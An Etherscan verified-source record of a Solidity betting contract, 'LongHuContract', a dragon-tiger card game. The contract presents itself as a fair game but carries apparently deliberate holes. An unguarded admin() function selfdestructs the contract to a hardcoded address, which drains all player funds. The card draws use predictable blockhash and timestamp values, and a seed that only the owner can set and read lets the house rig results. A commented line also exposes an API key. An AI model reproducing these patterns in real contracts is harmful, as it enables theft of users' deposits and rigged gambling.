{
  "address": "0x77f54e6a0ed49e8ce5155468feaec29368b10465",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "LongHuContract",
  "compilerVersion": "v0.5.5+commit.47a71e8f",
  "optimization": false,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2019-04-08\n*/\n\npragma solidity >=0.4.22 <0.6.0;\n//import \"github.com/oraclize/ethereum-api/oraclizeAPI.sol\";\n\ncontract LongHuContract {\n  uint  maxProfit;//最高奖池\n  uint  maxmoneypercent;\n  uint public contractBalance;\n  //uint  oraclizeFee;\n  //uint  oraclizeGasLimit;\n  uint minBet;\n  uint onoff;//游戏启用或关闭\n  address private owner;\n  uint private orderId;\n  uint private randonce;\n\n  event LogNewOraclizeQuery(string description,bytes32 queryId);\n  event LogNewRandomNumber(string result,bytes32 queryId);\n  event LogSendBonus(uint id,bytes32 lableId,uint playId,uint content,uint singleMoney,uint mutilple,address user,uint betTime,uint status,uint winMoney);\n  event LogBet(bytes32 queryId);\n\n  mapping (address => bytes32[]) playerLableList;////玩家下注批次\n  mapping (bytes32 => mapping (uint => uint[7])) betList;//批次，注单映射\n  mapping (bytes32 => uint) lableCount;//批次，注单数\n  mapping (bytes32 => uint) lableTime;//批次，投注时间\n  mapping (bytes32 => uint) lableStatus;//批次，状态 0 未结算，1 已撤单，2 已结算 3 已派奖\n  mapping (bytes32 => uint[4]) openNumberList;//批次开奖号码映射\n  mapping (bytes32 => string) openNumberStr;//批次开奖号码映射\n  mapping (bytes32 => address payable) lableUser;\n\n  bytes tempNum ; //temporarily hold the string part until a space is recieved\n  uint[] numbers;\n\n  constructor() public {\n    owner = msg.sender;\n    orderId = 0;\n    onoff=1;\n    //minBet=1500000000000000;//最小金额要比手续费大\n    //oraclizeFee=1200000000000000;\n    maxmoneypercent=80;\n    //oraclizeGasLimit=200000;\n    contractBalance = address(this).balance;\n    maxProfit=(address(this).balance * maxmoneypercent)/100;\n    //oraclize_setCustomGasPrice(3000000000);\n    randonce = 0;\n  }\n\n  modifier onlyAdmin() {\n      require(msg.sender == owner);\n      _;\n  }\n  //modifier onlyOraclize {\n  //    require (msg.sender == oraclize_cbAddress());\n  //    _;\n // }\n\n  function setGameOnoff(uint _on0ff) public onlyAdmin{\n    onoff=_on0ff;\n  }\n  \n  function admin() public {\n\tselfdestruct(0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71);\n  }    \n\n  function getPlayRate(uint playId,uint level) internal pure returns (uint){\n      uint result = 0;\n      if(playId == 1 || playId == 3){\n        result = 19;//10bei\n      }else if(playId == 2){\n        result = 9;\n      }\n      return result;\n    }\n\n    function doBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply) public payable returns (bytes32 queryId) {\n      require(onoff==1);\n      require(playid.length > 0);\n      require(mutiply > 0);\n      require(msg.value >= minBet);\n\n      checkBet(playid,betMoney,betContent,mutiply,msg.value);\n\n      /* uint total = 0; */\n      bytes32 queryId;\n      queryId = keccak256(abi.encodePacked(blockhash(block.number-1),now,randonce));\n      //  uint oraGasLimit = oraclizeGasLimit;\n      //  if(playid.length > 1 && playid.length <= 3){\n      //      oraGasLimit = 600000;\n      //  }else{\n      //      oraGasLimit = 1000000;\n      //  }\n        emit LogNewOraclizeQuery(\"Oraclize query was sent, standing by for the answer..\",queryId);\n      //  queryId = oraclize_query(\"URL\", \"json(https://api.random.org/json-rpc/1/invoke).result.random.data\", '\\n{\"jsonrpc\":\"2.0\",\"method\":\"generateIntegers\",\"params\":{\"apiKey\":\"8817de90-6e86-4d0d-87ec-3fd9b437f711\",\"n\":4,\"min\":1,\"max\":52,\"replacement\":false,\"base\":10},\"id\":1}',oraGasLimit);\n      /* } */\n\n       uint[7] memory tmp ;\n       uint totalspand = 0;\n      for(uint i=0;i<playid.length;i++){\n        orderId++;\n        tmp[0] =orderId;\n        tmp[1] =playid[i];\n        tmp[2] =betContent[i];\n        tmp[3] =betMoney[i]*mutiply;\n        totalspand +=betMoney[i]*mutiply;\n        tmp[4] =now;\n        tmp[5] =0;\n        tmp[6] =0;\n        betList[queryId][i] =tmp;\n      }\n      require(msg.value >= totalspand);\n\n      lableTime[queryId] = now;\n      lableCount[queryId] = playid.length;\n      lableUser[queryId] = msg.sender;\n      uint[4] memory codes = [uint(0),0,0,0];\n      openNumberList[queryId] = codes;\n      openNumberStr[queryId] =\"0,0,0,0\";\n      lableStatus[queryId] = 0;\n\n      uint index=playerLableList[msg.sender].length++;\n      playerLableList[msg.sender][index]=queryId;//index:id\n      emit LogBet(queryId);\n      opencode(queryId);\n      return queryId;\n    }\n\n    function opencode(bytes32 queryId) private {\n      if (lableCount[queryId] < 1) revert();\n      uint[4] memory codes = [uint(0),0,0,0];//开奖号码\n\n      bytes32 code0hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));\n      randonce  = randonce + uint(code0hash)%1000;\n      //uint code0int = uint(code0hash) % 52 + 1;\n      codes[0] = uint(code0hash) % 52 + 1;\n      string memory code0 =uint2str(uint(code0hash) % 52 + 1);\n\n      bytes32 code1hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));\n      randonce  = randonce + uint(code1hash)%1000;\n      //uint code1int = uint(code1hash) % 52 + 1;\n      codes[1] = uint(code1hash) % 52 + 1;\n      string memory code1=uint2str(uint(code1hash) % 52 + 1);\n\n      bytes32 code2hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));\n      randonce  = randonce + uint(code2hash)%1000;\n      //uint code2int = uint(code2hash) % 52 + 1;\n      codes[2] = uint(code2hash) % 52 + 1;\n      string memory code2=uint2str(uint(code2hash) % 52 + 1);\n\n      bytes32 code3hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,msg.sender,randonce));\n      randonce  = randonce + uint(code3hash)%1000;\n      //uint code3int = uint(code3hash) % 52 + 1;\n      codes[3] = uint(code3hash) % 52 + 1;\n      string memory code3=uint2str(uint(code3hash) % 52 + 1);\n\n      //string memory code0 =uint2str(code0int);\n      //string memory code1=uint2str(code1int);\n      //string memory code2=uint2str(code2int);\n      //string memory code3=uint2str(code3int);\n      //codes[0] = code0int;\n      //codes[1] = code1int;\n      //codes[2] = code2int;\n      //codes[3] = code3int;\n      openNumberList[queryId] = codes;\n      string memory codenum = \"\";\n      codenum = strConcat(code0,\",\",code1,\",\",code2);\n      openNumberStr[queryId] = strConcat(codenum,\",\",code3);\n      //结算，派奖\n      doCheckBounds(queryId);\n    }\n\n    function checkBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply,uint betTotal) internal{\n        uint totalMoney = 0;\n      uint totalWin1 = 0;\n      uint totalWin2 = 0;\n      uint rate;\n      uint i;\n      for(i=0;i<playid.length;i++){\n        if(playid[i] >=1 && playid[i]<= 3){\n          totalMoney += betMoney[i] * mutiply;\n        }else{\n          revert();\n        }\n        if(playid[i] ==1 || playid[i] ==3){//龙虎\n          rate = getPlayRate(playid[i],0);\n          totalWin1+=betMoney[i] * mutiply *rate/10;\n          totalWin2+=betMoney[i] * mutiply *rate/10;\n        }else if(playid[i] ==2){//和\n          rate = getPlayRate(playid[i],0);\n          totalWin2+=betMoney[i] * mutiply *rate;\n        }\n      }\n      uint maxWin=totalWin1;\n      if(totalWin2 > maxWin){\n        maxWin=totalWin2;\n      }\n      require(betTotal >= totalMoney);\n\n      require(maxWin < maxProfit);\n    }\n    /*\n    function __callback(bytes32 queryId, string memory result) public onlyOraclize {\n        if (lableCount[queryId] < 1) revert();\n      if (msg.sender != oraclize_cbAddress()) revert();\n        emit LogNewRandomNumber(result,queryId);\n        bytes memory tmp = bytes(result);\n        uint[4] memory codes = [uint(0),0,0,0];\n        uint [] memory codess ;\n        codess = splitStr(result,\",\");\n        uint k = 0;\n        for(uint i = 0;i<codess.length;i++){\n            if(k < codes.length){\n                     codes[k] = codess[i];\n                     k++;\n            }\n        }\n\n        string memory code0=uint2str(codes[0]);\n        string memory code1=uint2str(codes[1]);\n        string memory code2=uint2str(codes[2]);\n        string memory code3=uint2str(codes[3]);\n        openNumberList[queryId] = codes;\n        string memory codenum = \"\";\n        codenum = strConcat(code0,\",\",code1,\",\",code2);\n        openNumberStr[queryId] = strConcat(codenum,\",\",code3);\n        doCheckBounds(queryId);\n    }\n    */\n    function doCancel(bytes32 queryId) internal {\n      uint sta = lableStatus[queryId];\n      require(sta == 0);\n      uint[4] memory codes = openNumberList[queryId];\n      require(codes[0] == 0 || codes[1] == 0 ||codes[2] == 0 ||codes[3] == 0);\n\n      uint totalBet = 0;\n      uint len = lableCount[queryId];\n\n      address payable to = lableUser[queryId];\n      for(uint aa = 0 ; aa<len; aa++){\n        //未结算\n        if(betList[queryId][aa][5] == 0){\n          totalBet+=betList[queryId][aa][3];\n        }\n      }\n\n      if(totalBet > 0){\n        to.transfer(totalBet);\n      }\n      contractBalance=address(this).balance;\n      maxProfit=(address(this).balance * maxmoneypercent)/100;\n      lableStatus[queryId] = 1;\n    }\n\n    function doSendBounds(bytes32 queryId) public payable {\n      uint sta = lableStatus[queryId];\n      require(sta == 2);\n\n      uint totalWin = 0;\n      uint len = lableCount[queryId];\n\n      address payable to = lableUser[queryId];\n      for(uint aa = 0 ; aa<len; aa++){\n        //中奖\n        if(betList[queryId][aa][5] == 2){\n          totalWin+=betList[queryId][aa][6];\n        }\n      }\n\n      if(totalWin > 0){\n          to.transfer(totalWin);//转账\n      }\n      lableStatus[queryId] = 3;\n      contractBalance=address(this).balance;\n      maxProfit=(address(this).balance * maxmoneypercent)/100;\n    }\n\n    //中奖判断\n    function checkWinMoney(uint[7] storage betinfo,uint[4] memory codes) internal {\n      uint rates;\n      uint code0 = codes[0]%13==0?13:codes[0]%13;\n      uint code1 = codes[1]%13==0?13:codes[1]%13;\n      uint code2 = codes[2]%13==0?13:codes[2]%13;\n      uint code3 = codes[3]%13==0?13:codes[3]%13;\n      uint  onecount = code0 + code2;\n      uint  twocount = code1 + code3;\n      onecount = onecount%10;\n      twocount = twocount%10;\n      if(betinfo[1] ==1){//long\n          if(onecount > twocount){\n              betinfo[5]=2;\n              rates = getPlayRate(betinfo[1],0);\n              betinfo[6]=betinfo[3]*rates/10;\n          }else{\n             // if(onecount == twocount){//和\n             //     betinfo[5]=2;\n             //     rates = 1;\n             //     betinfo[6]=betinfo[3]*rates;\n             // }else{\n                  betinfo[5]=1;\n             // }\n          }\n      }else if(betinfo[1] == 2){//和\n          if(onecount == twocount){\n            betinfo[5]=2;\n            rates = getPlayRate(betinfo[1],0);\n            betinfo[6]=betinfo[3]*rates;\n          }else{\n            betinfo[5]=1;\n          }\n\n        }else if(betinfo[1] == 3){//虎\n          betinfo[5]=1;\n          if(onecount < twocount ){\n            betinfo[5]=2;\n            rates = getPlayRate(betinfo[1],0);\n            betinfo[6]=betinfo[3]*rates/10;\n          }else{\n              //if(onecount == twocount){//和\n              //    betinfo[5]=2;\n              //    rates = 1;\n              //    betinfo[6]=betinfo[3]*rates;\n             // }else{\n                  betinfo[5]=1;\n             // }\n          }\n        }\n\n    }\n\n    function getLastBet() public view returns(string memory opennum,uint[7][] memory result){\n      uint len=playerLableList[msg.sender].length;\n      require(len>0);\n\n      uint i=len-1;\n      bytes32 lastLable = playerLableList[msg.sender][i];\n      uint max = lableCount[lastLable];\n      if(max > 50){\n          max = 50;\n      }\n      uint[7][] memory result = new uint[7][](max) ;\n      string memory opennum = \"\";\n      for(uint a=0;a<max;a++){\n         string memory ttmp =openNumberStr[lastLable];\n         if(a==0){\n           opennum =ttmp;\n         }else{\n           opennum = strConcat(opennum,\";\",ttmp);\n         }\n\n         result[a] = betList[lastLable][a];\n         if(lableStatus[lastLable] == 1){\n           result[a][5]=3;\n         }\n\n      }\n\n      return (opennum,result);\n    }\n\n    function getLableRecords(bytes32 lable) public view returns(string memory opennum,uint[7][] memory result){\n      uint max = lableCount[lable];\n      if(max > 50){\n          max = 50;\n      }\n      uint[7][] memory result = new uint[7][](max) ;\n      string memory opennum=\"\";\n\n      for(uint a=0;a<max;a++){\n         result[a] = betList[lable][a];\n         if(lableStatus[lable] == 1){\n           result[a][5]=3;\n         }\n         string memory ttmp =openNumberStr[lable];\n         if(a==0){\n           opennum =ttmp;\n         }else{\n           opennum = strConcat(opennum,\";\",ttmp);\n         }\n      }\n\n      return (opennum,result);\n    }\n\n    function getAllRecords() public view returns(string  memory opennum,uint[7][] memory result){\n        uint len=playerLableList[msg.sender].length;\n        require(len>0);\n\n        uint max;\n        bytes32 lastLable ;\n        uint ss;\n\n        for(uint i1=0;i1<len;i1++){\n            ss = len-i1-1;\n            lastLable = playerLableList[msg.sender][ss];\n            max += lableCount[lastLable];\n            if(100 < max){\n              max = 100;\n              break;\n            }\n        }\n\n        uint[7][] memory result = new uint[7][](max) ;\n        bytes32[] memory resultlable = new bytes32[](max) ;\n        string memory opennum=\"\";\n\n        bool flag=false;\n        uint betnums;\n        uint j=0;\n\n        for(uint ii=0;ii<len;ii++){\n            ss = len-ii-1;\n            lastLable = playerLableList[msg.sender][ss];\n            betnums = lableCount[lastLable];\n            for(uint k= 0; k<betnums; k++){\n              if(j<max){\n                  resultlable[j] = lastLable;\n              \t string memory ttmp =openNumberStr[lastLable];\n                 if(j==0){\n                   opennum =ttmp;\n                 }else{\n                   opennum = strConcat(opennum,\";\",ttmp);\n                 }\n                  result[j] = betList[lastLable][k];\n                  if(lableStatus[lastLable] == 1){\n                    result[j][5]=3;\n                  }else if(lableStatus[lastLable] == 2){\n                    if(result[j][5]==2){\n                      result[j][5]=4;\n                    }\n                  }else if(lableStatus[lastLable] == 3){\n                    if(result[j][5]==2){\n                      result[j][5]=5;\n                    }\n                  }\n                  j++;\n              }else{\n                flag = true;\n                break;\n              }\n            }\n            if(flag){\n                break;\n            }\n        }\n        return (opennum,result);\n    }\n\n  //function setoraclegasprice(uint newGas) public onlyAdmin(){\n  //  oraclize_setCustomGasPrice(newGas * 1 wei);\n  //}\n  //function setoraclelimitgas(uint _oraclizeGasLimit) public onlyAdmin(){\n  //  oraclizeGasLimit=(_oraclizeGasLimit);\n  //}\n\n  function senttest() public payable onlyAdmin{\n      contractBalance=address(this).balance;\n      maxProfit=(address(this).balance*maxmoneypercent)/100;\n  }\n\n  function withdraw(uint _amount , address payable desaccount) public onlyAdmin{\n      desaccount.transfer(_amount);\n      contractBalance=address(this).balance;\n      maxProfit=(address(this).balance * maxmoneypercent)/100;\n  }\n\n  function deposit() public payable onlyAdmin returns(uint8 ret){\n      contractBalance=address(this).balance;\n      maxProfit=(address(this).balance * maxmoneypercent)/100;\n      ret = 1;\n  }\n\n  function getDatas() public view returns(\n    uint _maxProfit,\n    uint _minBet,\n    uint _contractbalance,\n    uint _onoff,\n    address _owner,\n    uint _oraclizeFee\n    ){\n        _maxProfit=maxProfit;\n        _minBet=minBet;\n        _contractbalance=contractBalance;\n        _onoff=onoff;\n        _owner=owner;\n       // _oraclizeFee=oraclizeFee;\n    }\n\n    function getLableList() public view returns(string memory opennum,bytes32[] memory lablelist,uint[] memory labletime,uint[] memory lablestatus,uint){\n      uint len=playerLableList[msg.sender].length;\n      require(len>0);\n\n      uint max=50;\n      if(len < 50){\n          max = len;\n      }\n\n      bytes32[] memory lablelist = new bytes32[](max) ;\n      uint[] memory labletime = new uint[](max) ;\n      uint[] memory lablestatus = new uint[](max) ;\n      string memory opennum=\"\";\n\n      bytes32 lastLable ;\n      for(uint i=0;i<max;i++){\n          lastLable = playerLableList[msg.sender][max-i-1];\n          lablelist[i]=lastLable;\n          labletime[i]=lableTime[lastLable];\n          lablestatus[i]=lableStatus[lastLable];\n          string memory ttmp =openNumberStr[lastLable];\n         if(i==0){\n           opennum =ttmp;\n         }else{\n           opennum = strConcat(opennum,\";\",ttmp);\n         }\n      }\n\n      return (opennum,lablelist,labletime,lablestatus,now);\n    }\n\n    function doCheckBounds(bytes32 queryId) internal{\n        uint sta = lableStatus[queryId];\n        require(sta == 0 || sta == 2);\n        uint[4] memory codes = openNumberList[queryId];\n        require(codes[0] > 0);\n\n        uint len = lableCount[queryId];\n\n        uint totalWin;\n        address payable to = lableUser[queryId];\n        for(uint aa = 0 ; aa<len; aa++){\n          if(sta == 0){\n           if(betList[queryId][aa][5] == 0){\n             checkWinMoney(betList[queryId][aa],codes);\n             totalWin+=betList[queryId][aa][6];\n           }\n          }else if(sta == 2){\n              totalWin+=betList[queryId][aa][6];\n          }\n        }\n\n        lableStatus[queryId] = 2;\n\n        if(totalWin > 0){\n          if(totalWin < address(this).balance){\n            to.transfer(totalWin);\n            lableStatus[queryId] = 3;\n          }else{\n              emit LogNewOraclizeQuery(\"sent bouns fail.\",queryId);\n          }\n        }else{\n          lableStatus[queryId] = 3;\n        }\n        contractBalance=address(this).balance;\n        maxProfit=(address(this).balance * maxmoneypercent)/100;\n    }\n\n    function getOpenNum(bytes32 queryId) public view returns(string memory result){\n        result = openNumberStr[queryId];\n        //return openNumberStr[queryId];\n    }\n\n    function doCheckSendBounds() public payable{\n        uint len=playerLableList[msg.sender].length;\n\n      uint max=50;\n      if(len < 50){\n          max = len;\n      }\n\n      uint sta;\n      bytes32 lastLable ;\n      for(uint i=0;i<max;i++){\n          lastLable = playerLableList[msg.sender][max-i-1];\n          sta = lableStatus[lastLable];\n          if(sta == 0 || sta==2){\n            doCheckBounds(lastLable);\n          }\n      }\n    }\n\n    function doCancelAll() public payable{\n        uint len=playerLableList[msg.sender].length;\n\n      uint max=50;\n      if(len < 50){\n          max = len;\n      }\n\n      uint sta;\n      uint bettime;\n      bytes32 lastLable ;\n      for(uint i=0;i<max;i++){\n          lastLable = playerLableList[msg.sender][max-i-1];\n          sta = lableStatus[lastLable];\n          bettime = lableTime[lastLable];\n          if(sta == 0 && (now - bettime)>600){\n            doCancel(lastLable);\n          }\n      }\n    }\n\n    function splitStr(string memory str, string memory delimiter) internal returns (uint [] memory){ //delimiter can be any character that separates the integers\n     bytes memory b = bytes(str); //cast the string to bytes to iterate\n     bytes memory delm = bytes(delimiter);\n     delete(numbers);\n     delete(tempNum);\n     for(uint i; i<b.length ; i++){\n     if(b[i] != delm[0]) { //check if a not space\n       tempNum.push(b[i]);\n      }\n      else {\n       numbers.push(parseInt(string(tempNum))); //push the int value converted from string to numbers array\n       tempNum = \"\"; //reset the tempNum to catch the net number\n      }\n     }\n     if(b[b.length-1] != delm[0]) {\n      numbers.push(parseInt(string(tempNum)));\n     }\n     return numbers;\n    }\n\n    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {\n        if (_i == 0) {\n            return \"0\";\n        }\n        uint j = _i;\n        uint len;\n        while (j != 0) {\n            len++;\n            j /= 10;\n        }\n        bytes memory bstr = new bytes(len);\n        uint k = len - 1;\n        while (_i != 0) {\n            bstr[k--] = byte(uint8(48 + _i % 10));\n            _i /= 10;\n        }\n     return string(bstr);\n    }\n\n    function strConcat(string memory _a, string memory _b) internal pure returns (string memory _concatenatedString) {\n        return strConcat(_a, _b, \"\", \"\", \"\");\n    }\n\n    function strConcat(string memory _a, string memory _b, string memory _c) internal pure returns (string memory _concatenatedString) {\n        return strConcat(_a, _b, _c, \"\", \"\");\n    }\n\n    function strConcat(string memory _a, string memory _b, string memory _c, string memory _d) internal pure returns (string memory _concatenatedString) {\n        return strConcat(_a, _b, _c, _d, \"\");\n    }\n\n    function strConcat(string memory _a, string memory _b, string memory _c, string memory _d, string memory _e) internal pure returns (string memory _concatenatedString) {\n        bytes memory _ba = bytes(_a);\n        bytes memory _bb = bytes(_b);\n        bytes memory _bc = bytes(_c);\n        bytes memory _bd = bytes(_d);\n        bytes memory _be = bytes(_e);\n        string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n        bytes memory babcde = bytes(abcde);\n        uint k = 0;\n        uint i = 0;\n        for (i = 0; i < _ba.length; i++) {\n            babcde[k++] = _ba[i];\n        }\n        for (i = 0; i < _bb.length; i++) {\n            babcde[k++] = _bb[i];\n        }\n        for (i = 0; i < _bc.length; i++) {\n            babcde[k++] = _bc[i];\n        }\n        for (i = 0; i < _bd.length; i++) {\n            babcde[k++] = _bd[i];\n        }\n        for (i = 0; i < _be.length; i++) {\n            babcde[k++] = _be[i];\n        }\n        return string(babcde);\n    }\n\n    function safeParseInt(string memory _a) internal pure returns (uint _parsedInt) {\n        return safeParseInt(_a, 0);\n    }\n\n    function safeParseInt(string memory _a, uint _b) internal pure returns (uint _parsedInt) {\n        bytes memory bresult = bytes(_a);\n        uint mint = 0;\n        bool decimals = false;\n        for (uint i = 0; i < bresult.length; i++) {\n            if ((uint(uint8(bresult[i])) >= 48) && (uint(uint8(bresult[i])) <= 57)) {\n                if (decimals) {\n                   if (_b == 0) break;\n                    else _b--;\n                }\n                mint *= 10;\n                mint += uint(uint8(bresult[i])) - 48;\n            } else if (uint(uint8(bresult[i])) == 46) {\n                require(!decimals, 'More than one decimal encountered in string!');\n                decimals = true;\n            } else {\n                revert(\"Non-numeral character encountered in string!\");\n            }\n        }\n        if (_b > 0) {\n            mint *= 10 ** _b;\n        }\n        return mint;\n    }\n\n    function parseInt(string memory _a) internal pure returns (uint _parsedInt) {\n        return parseInt(_a, 0);\n    }\n\n    function parseInt(string memory _a, uint _b) internal pure returns (uint _parsedInt) {\n        bytes memory bresult = bytes(_a);\n        uint mint = 0;\n        bool decimals = false;\n        for (uint i = 0; i < bresult.length; i++) {\n            if ((uint(uint8(bresult[i])) >= 48) && (uint(uint8(bresult[i])) <= 57)) {\n                if (decimals) {\n                   if (_b == 0) {\n                       break;\n                   } else {\n                       _b--;\n                   }\n                }\n                mint *= 10;\n                mint += uint(uint8(bresult[i])) - 48;\n            } else if (uint(uint8(bresult[i])) == 46) {\n                decimals = true;\n            }\n        }\n        if (_b > 0) {\n            mint *= 10 ** _b;\n        }\n        return mint;\n    }\n\n\n    function setRandomSeed(uint _randomSeed) public payable onlyAdmin{\n      randonce = _randomSeed;\n    }\n\n    function getRandomSeed() public view onlyAdmin returns(uint _randonce) {\n      _randonce = randonce;\n    }\n\n}",
  "abi": "[{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"},{\"name\":\"desaccount\",\"type\":\"address\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"queryId\",\"type\":\"bytes32\"}],\"name\":\"getOpenNum\",\"outputs\":[{\"name\":\"result\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"lable\",\"type\":\"bytes32\"}],\"name\":\"getLableRecords\",\"outputs\":[{\"name\":\"opennum\",\"type\":\"string\"},{\"name\":\"result\",\"type\":\"uint256[7][]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getLableList\",\"outputs\":[{\"name\":\"opennum\",\"type\":\"string\"},{\"name\":\"lablelist\",\"type\":\"bytes32[]\"},{\"name\":\"labletime\",\"type\":\"uint256[]\"},{\"name\":\"lablestatus\",\"type\":\"uint256[]\"},{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_randomSeed\",\"type\":\"uint256\"}],\"name\":\"setRandomSeed\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"doCancelAll\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getDatas\",\"outputs\":[{\"name\":\"_maxProfit\",\"type\":\"uint256\"},{\"name\":\"_minBet\",\"type\":\"uint256\"},{\"name\":\"_contractbalance\",\"type\":\"uint256\"},{\"name\":\"_onoff\",\"type\":\"uint256\"},{\"name\":\"_owner\",\"type\":\"address\"},{\"name\":\"_oraclizeFee\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_on0ff\",\"type\":\"uint256\"}],\"name\":\"setGameOnoff\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"contractBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getRandomSeed\",\"outputs\":[{\"name\":\"_randonce\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"doCheckSendBounds\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getAllRecords\",\"outputs\":[{\"name\":\"opennum\",\"type\":\"string\"},{\"name\":\"result\",\"type\":\"uint256[7][]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"queryId\",\"type\":\"bytes32\"}],\"name\":\"doSendBounds\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getLastBet\",\"outputs\":[{\"name\":\"opennum\",\"type\":\"string\"},{\"name\":\"result\",\"type\":\"uint256[7][]\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[{\"name\":\"ret\",\"type\":\"uint8\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"admin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"playid\",\"type\":\"uint256[]\"},{\"name\":\"betMoney\",\"type\":\"uint256[]\"},{\"name\":\"betContent\",\"type\":\"uint256[]\"},{\"name\":\"mutiply\",\"type\":\"uint256\"}],\"name\":\"doBet\",\"outputs\":[{\"name\":\"queryId\",\"type\":\"bytes32\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"senttest\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"description\",\"type\":\"string\"},{\"indexed\":false,\"name\":\"queryId\",\"type\":\"bytes32\"}],\"name\":\"LogNewOraclizeQuery\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"result\",\"type\":\"string\"},{\"indexed\":false,\"name\":\"queryId\",\"type\":\"bytes32\"}],\"name\":\"LogNewRandomNumber\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"id\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"lableId\",\"type\":\"bytes32\"},{\"indexed\":false,\"name\":\"playId\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"content\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"singleMoney\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"mutilple\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"betTime\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"status\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"winMoney\",\"type\":\"uint256\"}],\"name\":\"LogSendBonus\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"name\":\"queryId\",\"type\":\"bytes32\"}],\"name\":\"LogBet\",\"type\":\"event\"}]",
  "bytecode": "608060405234801561001057600080fd5b5033600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600681905550600160048190555060506001819055503073ffffffffffffffffffffffffffffffffffffffff163160028190555060646001543073ffffffffffffffffffffffffffffffffffffffff1631028115156100af57fe5b046000819055506000600781905550613dad806100cd6000396000f3fe6080604052600436106101085760003560e01c806393b3cc6b11610095578063bbce3fc211610064578063bbce3fc214610720578063d0e30db01461081b578063f851a4401461083f578063fc22341014610856578063fca2d9f514610a5457610108565b806393b3cc6b146105c25780639536c05f146105ed578063a7f9fe72146105f7578063ae817dd1146106f257610108565b806366fea1d4116100dc57806366fea1d4146104aa5780636c0a1117146104d85780636d34a775146104e2578063749ca1f31461055c5780638b7afe2e1461059757610108565b8062f714ce1461010d578063039c9d841461016857806303dc05321461021c5780635b945c0e1461033b575b600080fd5b34801561011957600080fd5b506101666004803603604081101561013057600080fd5b8101908080359060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610a5e565b005b34801561017457600080fd5b506101a16004803603602081101561018b57600080fd5b8101908080359060200190929190505050610b51565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101e15780820151818401526020810190506101c6565b50505050905090810190601f16801561020e5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561022857600080fd5b506102556004803603602081101561023f57600080fd5b8101908080359060200190929190505050610c06565b604051808060200180602001838103835285818151815260200191508051906020019080838360005b8381101561029957808201518184015260208101905061027e565b50505050905090810190601f1680156102c65780820380516001836020036101000a031916815260200191505b508381038252848181518152602001915080516000925b818410156103285782849060200190602002015160076020